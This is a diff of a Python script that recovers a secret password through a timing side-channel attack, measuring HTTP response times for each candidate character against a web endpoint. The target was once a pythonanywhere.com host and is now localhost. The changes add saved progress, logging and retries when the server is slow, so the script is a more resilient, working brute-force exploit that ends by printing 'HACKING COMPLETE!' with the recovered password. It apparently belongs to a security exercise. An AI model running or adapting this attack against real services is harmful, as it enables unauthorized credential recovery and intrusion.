@@ -1,9 +1,10 @@
 from statistics import mean
 import requests
 import time
-from datetime import datetime, timedelta
+from datetime import datetime
 
-URL = "https://barfishilev.pythonanywhere.com/"
+# URL = "https://barfishilev.pythonanywhere.com/"
+URL = "http://127.0.0.1:5000/"
 REPEAT_CHECK = 8
 POOL = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 # Alternative smaller pool for testing:
@@ -14,6 +15,25 @@ MAX_PASSWORD_LENGTH = 6
 last_day = -1
 last_hour = -1
 current_letter = ''
+
+
+def save_progress(found_char, url=URL):
+    with open(f"{url[8:-20]}_progress.txt", "a") as f:
+        f.write(found_char)
+ 
+
+def load_progress(url=URL):
+    try:
+        with open(f"{url[8:-20]}_progress.txt", "r") as f:
+            return f.read().strip()
+    except Exception:
+        return ""
+
+
+def log_save(message, url=URL):
+    with open(f"{url[8:-20]}_log.txt", "a") as f:
+        f.write(f"{message}\n")
+
 
 def timeit(url2check,  repeat=1):
     """
@@ -52,6 +72,23 @@ def remove_4(times):
     return times
 
 
+def check_server_load(time_taken, repeat, threshold, retries, wait_time, url2check):
+    """Checks if the server is overloaded based on the time taken for a request."""
+    count = 0
+    while time_taken > threshold:
+        log_save('Request took too long, possible server issue. Retrying after wait...')
+        time.sleep(wait_time)
+        check_hour_change()
+        time_taken = timeit(url2check, repeat)
+        log_save(f'RETRY TIME: {time_taken}')
+        count += 1
+
+        if count >= retries:
+            log_save('Server is too loaded and slow, please try again later.')
+            raise Exception('Server is too loaded and slow, please try again later.')
+    return time_taken
+
+
 def find_cur_letter(url, pool, padding_length):
     """
     Finds the current key letter by measuring response times of every char
@@ -73,18 +110,19 @@ def find_cur_letter(url, pool, padding_length):
         
         test_url = url + ch * padding_length
         t = timeit(test_url, REPEAT_CHECK)
+        t = check_server_load(t, REPEAT_CHECK, wrong_time + 1, 3, 100, test_url)
         timings[ch] = t
-        print(f'KEY: {ch} | TIME: {t}')
+        log_save(f'KEY: {ch} | TIME: {t}')
         if wrong_time - t > 0.4:
-            print('=========================')
-            print(f'KEY FOUND: {ch}')
-            print('=========================')
+            log_save('=========================\n' \
+                     f'KEY FOUND: {ch}\n' \
+                     '=========================')
             return ch
 
     sorted_timings = sorted(timings.items(), key=lambda x: x[1])
     lowest_time_chars = {}
-    print('=========================')
-    print('Checking 4 lowest keys...')
+    log_save('=========================\n' \
+             'Checking 4 lowest keys...')
     for i in range(4):
         last_key_letter = current_letter
         check_hour_change()
@@ -93,13 +131,14 @@ def find_cur_letter(url, pool, padding_length):
         
         test_url = url + sorted_timings[i][0] * padding_length
         t = timeit(test_url, REPEAT_CHECK + 5)
+        t = check_server_load(t, REPEAT_CHECK + 5, wrong_time + 1, 3, 100, test_url)
         lowest_time_chars[sorted_timings[i][0]] = t
-        print(f'KEY: {sorted_timings[i][0]} | TIME: {t}')
+        log_save(f'KEY: {sorted_timings[i][0]} | TIME: {t}')
     
     sorted_timings = sorted(lowest_time_chars.items(), key=lambda x: x[1])
-    print('=========================')
-    print(f'KEY FOUND: {sorted_timings[0][0]}')
-    print('=========================')
+    log_save('=========================\n' \
+             f'KEY FOUND: {sorted_timings[0][0]}' \
+             '\n=========================')
     return sorted_timings[0][0]
 
 
@@ -109,7 +148,7 @@ def check_hour_change():
     now = datetime.now()
 
     if now.minute >= 58:
-        print(f"Hour will change in ~2 minutes. Waiting...")
+        log_save(f"Hour will change in ~2 minutes. Waiting...")
         time.sleep(120)
         now = datetime.now()
 
@@ -120,10 +159,10 @@ def check_hour_change():
         last_day = day
         last_hour = hour
 
-        print('=========================')
-        print('Hour/Day changed, finding new key letter...')
+        log_save('=========================\n' \
+                 'Hour/Day changed, finding new key letter...')
         current_letter = find_cur_letter(URL, POOL, PADDING_LENGTH)
-        
+
 
 def hack_password(url, pool, max_length, padding_length):
     """
@@ -142,8 +181,13 @@ def hack_password(url, pool, max_length, padding_length):
     """
     password = []
     possible_chars = ' ' + pool
+    
+    progress = load_progress()
+    for ch in progress:
+        password.append(ch)
+    log_save(f'LOADED PROGRESS: {"".join(password).strip()}')
 
-    for i in range(max_length):
+    for i in range(len(progress), max_length):
         timings = {}
 
         check_hour_change()
@@ -152,8 +196,6 @@ def hack_password(url, pool, max_length, padding_length):
         test_wrong_url = url + ''.join(test_wrong_pass)
         wrong_time = timeit(test_wrong_url, 20)
 
-        cur_letter_time = 0.0
-
         for ch in possible_chars:
             check_hour_change()
 
@@ -161,50 +203,51 @@ def hack_password(url, pool, max_length, padding_length):
             test_pass[i + max_length] = ch
             test_url = url + ''.join(test_pass)
             t = timeit(test_url, REPEAT_CHECK)
-            print(f'POS: {i} | CHAR: {ch} | TIME: {t}')
+            log_save(f'POS: {i} | CHAR: {ch} | TIME: {t}')
 
-            if ch == current_letter:
-                cur_letter_time = t
-                continue
+            t = check_server_load(t, REPEAT_CHECK, wrong_time + 1, 3, 100, test_url)
                 
-            if wrong_time - t > 0.2:
-                print('=============================')
-                print(f'CHAR FOUND: {ch} | AT POS {i}')
+            if wrong_time - t > 0.2 and ch != current_letter:
                 password.append(ch)
-                print(f"CURRENT PASSWORD: {''.join(password).strip()}")
-                print('=============================')
+                log_save('=============================\n' \
+                         f'CHAR FOUND: {ch} | AT POS {i}\n' \
+                         f'CURRENT PASSWORD: {"".join(password).strip()}\n' \
+                         '=============================')
+                save_progress(ch)
                 break
 
             timings[ch] = t
+
         else:
-            timings[current_letter] = cur_letter_time
             sorted_timings = sorted(timings.items(), key=lambda x: x[1])
             lowest_time_chars = {}
-            print('=============================')
-            print('Checking 4 lowest chars...')
+            log_save('=============================\n' \
+                     'Checking 4 lowest chars...')
             for j in range(4):
                 check_hour_change()
-                
+
                 test_pass = [current_letter] * padding_length
                 test_pass[i + max_length] = sorted_timings[j][0]
                 test_url = url + ''.join(test_pass)
                 t = timeit(test_url, REPEAT_CHECK + 5)
+                t = check_server_load(t, REPEAT_CHECK + 5, wrong_time + 1, 3, 100, test_url)
                 lowest_time_chars[sorted_timings[j][0]] = t
-                print(f'CHAR: {sorted_timings[j][0]} | TIME: {t}')
+                log_save(f'CHAR: {sorted_timings[j][0]} | TIME: {t}')
             
             sorted_lowest = sorted(lowest_time_chars.items(), key=lambda x: x[1])
-            print('=============================')
-            print(f'CHAR FOUND: {sorted_lowest[0][0]} | AT POS: {i}')
             password.append(sorted_lowest[0][0])
-            print(f"CURRENT PASSWORD: {''.join(password).strip()}")
-            print('=============================')
+            log_save('=============================\n' \
+                     f'CHAR FOUND: {sorted_lowest[0][0]} | AT POS {i}\n' \
+                     f'CURRENT PASSWORD: {"".join(password).strip()}\n' \
+                     '=============================')
+            save_progress(sorted_lowest[0][0])
     
     secret_password = ''.join(password).strip()
-    print('===========================================')
-    print('HACKING COMPLETE!')
-    print(f'SECRET PASSWORD FOUND: {secret_password}')
-    print(f'URL: {URL}{secret_password}')
-    print('===========================================')
+    log_save('===========================================\n' \
+             'HACKING COMPLETE!\n' \
+             f'SECRET PASSWORD FOUND: {secret_password}\n' \
+             f'URL: {URL}{secret_password}\n' \
+             '===========================================')
     return secret_password
 
 
@@ -212,10 +255,6 @@ def check_password(url, password):
     """
     Checks if the given password is correct by sending a request to the server.
     '1' indicates a correct password, while '0' indicates an incorrect one.
-    
-    :param url: (str) The base URL to test.
-    :param password: (str) The password to check.
-    :return: (bool) True if the password is correct, False otherwise.
     """
     r = requests.get(url + password, allow_redirects=True)
     value = r.text
@@ -223,4 +262,4 @@ def check_password(url, password):
 
 if __name__ == '__main__':
     secret_password = hack_password(URL, POOL, MAX_PASSWORD_LENGTH, PADDING_LENGTH)
-    print(f'IS CORRECT: {check_password(URL, secret_password)}')
+    log_save(f'IS CORRECT: {check_password(URL, secret_password)}')
